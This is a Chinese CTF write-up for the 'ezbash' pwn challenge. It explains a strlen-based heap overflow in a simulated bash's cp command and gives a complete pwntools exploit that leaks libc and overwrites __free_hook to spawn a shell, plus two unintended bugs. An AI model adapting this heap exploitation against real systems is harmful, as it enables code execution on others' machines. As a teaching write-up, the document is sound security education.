# ezbash

## 分析

题目模拟了一个简易版的bash

一个节点对应的结构体如下

```C
typedef enum
{
	DIR,
	FIL,
} TYPE;

struct Node
{
	TYPE type;
	char Name[0x10];
	char *content;
	struct Node *pre;
	struct Node *next;
	struct Node *parent;
	struct Node *head;
};
```

在cp的实现中，当目标文件名已经存在时，源文件内容会直接覆盖目标文件内容
而源文件和目标文件都有内容时，需要考虑重新分配内存空间，这里的实现存在一定的不严谨
`overwrite`函数中

![](https://md.buptmerak.cn/uploads/upload_416fc9a06ffe5cf6183584ff14323562.png)


注意到这里使用`strlen`测量长度，有一种可能当堆块复用时chunk的内容和下一个chunk的size位是连在一起的，就会发生`strlen`测出来的长度大于内容实际长度的情况

而一个文件内容的写入使用的是`echo`
这里本人悄悄把重定向符改成了`->`，主要是为了保证一定的逆向过程（，配合`echo`能够对文件写入内容
然而`echo`写入内容时对内存的申请并不根据实际size申请
而是根据实际输入情况动态变化，每次变化`DEFAULT_BUFSIZE=0x150`的倍数，相对不好控制大小


![](https://md.buptmerak.cn/uploads/upload_b79645652a9a1dc6579116e67f1c858f.png)



但是同样在cp功能中，当目标文件存在但没有写入过内容时，需要申请相应的空间存放源文件内容，这里就是根据源文件内容长度进行的申请，所以可以很好地用来控制size

![](https://md.buptmerak.cn/uploads/upload_4cf460598bbafcb91a152da2cb42bfef.png)

![](https://md.buptmerak.cn/uploads/upload_76ba0c803969e212693ce656263bb2c6.png)



## 思路

根据上述，构造内容拼接到下一个chunk的size，使`strlen`测出的长度大于实际长度两个字节，控制源文件内容长度与目标文件的实际长度+2相同，并布置源文件内容的最后两个字节为想要的size，从而利用堆溢出造成chunk overlap

改成一个很大的数字，进而释放掉，泄露libc基址

在这之后利用读入command时使用`realloc`动态分配内容，输入较多内容从而直接拿回unsorted bin，并事先在其中包含一块tcache，最后打tcache即可getshell。需要注意的是这一块tcache原本属于节点之一，所以顺手把其中的指针都清零避免后续在遍历节点时出现意料之外的crash。


## exp

```python
from pwn import*
context(os='linux', arch='amd64', log_level='debug')
r = process('./ezbash')
libc = ELF('./libc.so.6')

sla = lambda x : r.sendlineafter('hacker:/$ ', x)

p = "touch "+"AAA"
sla(p)
p = "touch "+"BBB"
sla(p)
p = "touch "+"CCC"
sla(p)

p = 'echo '+'A'*0xf8+" -> "+'AAA'
sla(p)
p = 'cp AAA BBB'
sla(p)

p = 'echo '+'A'*0xf8
p = p.encode('ISO-8859-1')
p+= p16(0x431)
p = p.decode('ISO-8859-1')
p+= ' -> '+'CCC'
sla(p)

for i in range(10):
	p = "touch "+"pad"+str(i)
	sla(p)

p = 'cp CCC BBB'
sla(p)

p = 'rm CCC'
sla(p)

p = 'echo '.encode('ISO-8859-1')
p+= p8(0xd0)
p = p.decode('ISO-8859-1')
p+= ' -> '
p+= 'BBB'
sla(p)

p = 'cp BBB pad9'
sla(p)

p = 'cat pad9'
sla(p)
libc.address = u64(r.recvuntil(b'\x7f')[-6:]+b'\x00\x00')-\
	1104-0x10-libc.sym['__malloc_hook']

p = 'rm pad0'
sla(p)

p = b'A'*0x130
p+= p64(0)+p64(0x51)
p+= p64(libc.sym['__free_hook']-4)
p+= p64(0)*8+p64(0x51)+p64(0)*6
sla(p)

p = 'touch final1\x00'
sla(p)

p = 'echo /bin/sh -> final1'
sla(p)

p = b'touch '+p64(libc.sym['system'])
sla(p)

p = 'rm final1'
sla(p)

log.success(hex(libc.address))
r.interactive()
```

## 非预期

（早知道不设计洞了，让大佬🚪ri就完事了orz）

最后提交的wp中，只有r4战队使用的是预期解，非预期有两种

1. cp中，当目标文件内容⻓度小于源文件内容长度，realloc返回值赋给了结构体指针，又能够以指针+0x18索引进行写操作，于是存在任意写，这也是大部分战队提交的wp中利用的漏洞。这里纯属本人沙贝了不知道为啥少打了东西😢

2. 还有一个洞在`cd`中`strcat`拼接路径时，当前路径名称存在bss段，其下方放了一个指向当前目录节点的指针，对路径字符串的长度限制不到位于是存在off by one。然而由于使用的是`strcat`，复制后会添加上截断字符，会把指针截断，所以最终只能用作off by null使用，可以用来控制节点。（polaris大佬的做法）